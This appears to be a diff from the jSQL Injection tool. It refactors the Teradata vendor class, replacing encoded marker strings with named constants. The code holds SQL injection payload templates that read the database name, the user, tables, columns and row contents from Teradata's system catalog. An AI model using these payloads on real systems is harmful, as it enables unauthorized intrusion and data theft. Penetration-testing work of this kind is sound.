@@ -1,5 +1,9 @@
 package com.jsql.model.injection.vendor;
 
+import static com.jsql.model.accessible.DataAccess.QTE_SQL;
+import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
+import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;
+
 import java.util.ArrayList;
 import java.util.List;
 
@@ -8,36 +12,36 @@ import com.jsql.model.bean.database.Database;
 import com.jsql.model.bean.database.Table;
 import com.jsql.util.StringUtil;
 
-public class TeradataVendor extends AbstractVendor {
+public class TeradataVendor extends AbstractVendorDefault {
 
     @Override
     public String getSqlInfos() {
         return
-            "select'-'||'%04'||" +
-            "database||'%04'||" +
+            "select'-'||'"+ SEPARATOR_SQL +"'||" +
+            "database||'"+ SEPARATOR_SQL +"'||" +
             "user||" +
-            "'%01%03%03%07'" +
+            "'"+ TRAIL_SQL +"'" +
             "";
     }
 
     @Override
     public String getSqlDatabases() {
         return
-            "select+'%04'||DatabaseName||'%050%04%01%03%03%07'FROM" +
+            "select+'"+ SEPARATOR_SQL +"'||DatabaseName||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'FROM" +
             "(select+DatabaseName,ROW_NUMBER()over(ORDER+BY+DatabaseName)AS+rnum+from+DBC.DBASE)x+where+1=1+{limit}";
     }
 
     @Override
     public String getSqlTables(Database database) {
         return
-            "select+'%04'||TVMName||'%050%04%01%03%03%07'FROM" +
+            "select+'"+ SEPARATOR_SQL +"'||TVMName||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'FROM" +
             "(select+TVMName,ROW_NUMBER()over(ORDER+BY+TVMName)AS+rnum+from+DBC.TVM+t+inner+join+DBC.DBASE+d+on+t.DatabaseId=d.DatabaseId+where+DatabaseName='" + database + "')x+where+1=1+{limit}";
     }
 
     @Override
     public String getSqlColumns(Table table) {
         return
-            "select+'%04'||FieldName||'%050%04%01%03%03%07'FROM" +
+            "select+'"+ SEPARATOR_SQL +"'||FieldName||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'FROM" +
             "(select+FieldName,ROW_NUMBER()over(ORDER+BY+FieldName)AS+rnum+from(select+distinct+FieldName+"
             + "from+DBC.TVFIELDS+c+inner+join+DBC.TVM+t+on+c.TableId=t.TVMId+"
             + "+inner+join+DBC.DBASE+d+on+t.DatabaseId=d.DatabaseId+"
@@ -53,7 +57,7 @@ public class TeradataVendor extends AbstractVendor {
         formatListColumn = "trim(coalesce(''||" + formatListColumn + ",''))";
         
         return
-            "SELECT'%04'||r||'%050%04%01%03%03%07'from(select+" + formatListColumn + "+r,ROW_NUMBER()over(ORDER+BY+1)AS+rnum+from+" + database + "." + table + ")x+where+1=1+{limit}";
+            "SELECT'"+ SEPARATOR_SQL +"'||r||'"+ QTE_SQL +"0"+ SEPARATOR_SQL +""+ TRAIL_SQL +"'from(select+" + formatListColumn + "+r,ROW_NUMBER()over(ORDER+BY+1)AS+rnum+from+" + database + "." + table + ")x+where+1=1+{limit}";
     }
 
     @Override
@@ -66,7 +70,7 @@ public class TeradataVendor extends AbstractVendor {
                  "'SQLi'||NULLIF(substr(" +
                  "(" + sqlQuery + ")," +
                  startPosition + "" +
-             "),'%01%03%03%07')";
+             "),'"+ TRAIL_SQL +"')";
      }
 
      @Override
